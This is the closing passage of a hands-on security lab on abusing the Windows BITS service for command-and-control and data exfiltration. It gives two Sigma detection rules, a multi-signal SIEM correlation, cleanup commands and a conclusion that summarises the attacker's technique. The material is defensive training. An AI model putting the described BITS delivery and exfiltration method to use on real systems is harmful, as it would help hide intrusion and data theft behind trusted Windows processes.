| C2 Pull Initiated | Sysmon 3 — svchost.exe → Ubuntu IP; BITS 59 — transfer started |
| Payload Delivered | BITS 60 — download complete; Sysmon 11 — file written by svchost.exe |
| Exfiltration Started | BITS 59 — upload job transfer started |
| Exfiltration Complete | BITS 60 — upload job completed |

---

### Phase 16: Sigma Rules

Sigma is a vendor-neutral detection format that converts to Splunk SPL, Elastic EQL, Microsoft Sentinel KQL, Chronicle YARA-L, and any other SIEM query language via the `sigma-cli` converter. Write two rules: one targeting the BITS Operational log, one targeting process creation.

**Rule 1 — BITS transfer with a non-Microsoft remote URL:**

```yaml
title: BITS Transfer Job with Non-Microsoft Remote URL
id: a7f3b2d1-4e8c-4a9f-b61d-2c5e7f9a0b3d
status: experimental
description: >
  Detects BITS transfer jobs where the remote URL does not resolve to Microsoft
  update infrastructure. Malware including UBoatRAT, StrongPity, and NOBELIUM
  components use BITS to deliver payloads and exfiltrate data while masking all
  network activity behind svchost.exe.
references:
  - https://attack.mitre.org/techniques/T1197/
  - https://unit42.paloaltonetworks.com/unit42-uboatrat-navigates-east-asia/
author: Lab — Detection Engineering Module
date: 2024-01-01
tags:
  - attack.persistence
  - attack.defense_evasion
  - attack.command_and_control
  - attack.exfiltration
  - attack.t1197
logsource:
  product: windows
  service: bits-client
detection:
  selection:
    EventID: 59
  filter_microsoft:
    url|contains:
      - '.microsoft.com'
      - '.windowsupdate.com'
      - '.windows.com'
      - '.office.com'
      - '.visualstudio.com'
      - 'delivery.mp.microsoft.com'
  filter_empty:
    url: ''
  condition: selection and not filter_microsoft and not filter_empty
fields:
  - EventID
  - name
  - url
  - localName
  - bytesTotal
falsepositives:
  - Third-party software using BITS for updates — add their domains to filter_microsoft
  - Software deployment tooling such as SCCM or Intune
level: medium
```

**Rule 2 — bitsadmin.exe used to register a non-Microsoft remote file:**

```yaml
title: BITSAdmin Invoked to Add Remote File with Non-Microsoft URL
id: c9e1a0f2-7b3d-4c8e-a5f6-1d2b3c4e5f6a
status: experimental
description: >
  Detects bitsadmin.exe invoked with the /addfile switch and a remote URL not
  belonging to Microsoft's distribution infrastructure. Though deprecated in
  favour of PowerShell, bitsadmin ships on all current Windows builds and
  appears in documented malware toolchains for BITS-based C2 and exfiltration.
references:
  - https://attack.mitre.org/techniques/T1197/
author: Lab — Detection Engineering Module
date: 2024-01-01
tags:
  - attack.defense_evasion
  - attack.persistence
  - attack.t1197
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains: '/addfile'
  filter_microsoft:
    CommandLine|contains:
      - '.microsoft.com'
      - '.windowsupdate.com'
      - '.office.com'
  condition: selection and not filter_microsoft
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Legitimate administrative use of bitsadmin for internal software deployment
level: high
```

**Step 1 — Identify false positive gaps:**

Looking at Rule 1: what URL patterns specific to your environment's third-party software vendors would you need to add to `filter_microsoft`? List three candidates.

**Step 2 — Multi-signal SIEM correlation:**

A single-indicator rule produces noise in any active environment. The following compound logic, evaluated across all events from the same host within a five-minute window, reduces false positives to near zero while preserving high-confidence detection:

```
IF on the same host within 5 minutes:
  (1) bitsadmin.exe executed                             [Sysmon Event 1]
  AND (2) BITS job started with non-Microsoft URL        [BITS Operational Event 59]
  AND (3) svchost.exe connected to the same IP as (2)   [Sysmon Event 3]
  AND (4) File written outside SoftwareDistribution\    [Sysmon Event 11]
THEN: HIGH CONFIDENCE — T1197 BITS Abuse
```

Each signal alone could fire on legitimate administrative activity. All four together, on the same host, within five minutes, are operationally unambiguous. This is exactly the chain of events you reconstructed manually in Phase 15 — now expressed as an automated correlation rule.

---

### Cleanup

Remove all artefacts and return the endpoint to its baseline state.

**Ubuntu:**

```bash
# Press CTRL+C in the Ubuntu terminal to stop the web server
```

**Windows — Administrator PowerShell:**

```powershell
# Cancel any remaining BITS jobs
Get-BitsTransfer -AllUsers | Remove-BitsTransfer

# Remove all downloaded and created files from the lab
@(
  "C:\Users\Public\implant.dat",
  "C:\Users\Public\config.dat",
  "C:\Users\Public\beacon.dat",
  "C:\Users\Public\sensitive.txt",
  "C:\Users\Public\bits_callback.log",
  "C:\ProgramData\beacon.dat",
  "C:\ProgramData\next_stage.dat"
) | ForEach-Object {
  Remove-Item $_ -Force -ErrorAction SilentlyContinue
}

# Remove the scheduled task created by the simulation
# (Adjust the task name if your setup script uses a different one)
Unregister-ScheduledTask -TaskName "Windows_Update_Helper" -Confirm:$false -ErrorAction SilentlyContinue

# Verify BITS queue is completely empty
bitsadmin /list /allusers

# Verify no stray .dat files remain under ProgramData
Get-ChildItem "C:\ProgramData\" -Filter "*.dat" -ErrorAction SilentlyContinue |
  Select-Object Name, FullName
```

Close all tool windows — Procmon, Wireshark, Process Explorer, and Event Viewer.

---

### Conclusion

In this lab you worked through the same technique from three perspectives that mirror the division of labour inside a real security organisation.

As a **malware analyst**, you received a file with no prior knowledge of its purpose. Working across Procmon, Wireshark, Process Explorer, and the BITS Operational log, you reconstructed the complete behavioral picture: which process ran, what it spawned, what it wrote to disk, how it established persistence, which Windows service it co-opted for network transfers, and what data left the machine. You reached the conclusion — BITS abuse for C2 and exfiltration — through evidence, not by being told.

As a **red team operator**, you reproduced every component of that mechanism with full intentionality. You now understand what each BITS job type does at the protocol level, how the BITS service manages job lifecycle from creation through completion, why `svchost.exe` attribution makes this traffic blend into ordinary Windows Update noise, and how the callback execution mechanism chains a download directly into silent post-transfer execution without leaving an additional persistence artefact.

As a **detection engineer**, you built layered coverage across three log sources, wrote two production-ready Sigma rules targeting both the BITS Operational log and process creation telemetry, and expressed the complete attack chain as a compound SIEM correlation that a SOC analyst can deploy and tune. The multi-signal model demonstrates why single-indicator alerting produces noise while compound correlation produces actionable detections.

The technique — T1197 BITS Jobs — is not exotic or rare. It has appeared in campaigns attributed to UBoatRAT (2017), StrongPity (2021), and NOBELIUM (2021). The BITS Operational log, Sysmon, and the two Sigma rules you built today generalise across all of them.

<br></br>

# Finished?

[Back to Card's Main Page](../Backround_Intelligent_Transfer_Service_As_Exfil.md)****
